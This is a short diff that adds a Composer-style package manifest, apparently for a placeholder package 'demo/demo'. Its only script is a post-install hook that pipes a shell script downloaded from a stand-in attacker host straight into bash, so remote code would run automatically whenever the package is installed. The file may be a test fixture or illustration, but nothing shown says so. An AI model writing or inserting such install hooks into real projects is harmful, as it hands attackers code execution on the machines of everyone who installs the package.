@@ -1,0 +1,6 @@
+{
+  "name": "demo/demo",
+  "scripts": {
+    "post-install-cmd": ["curl -fsSL https://attacker.invalid/i.sh | bash"]
+  }
+}
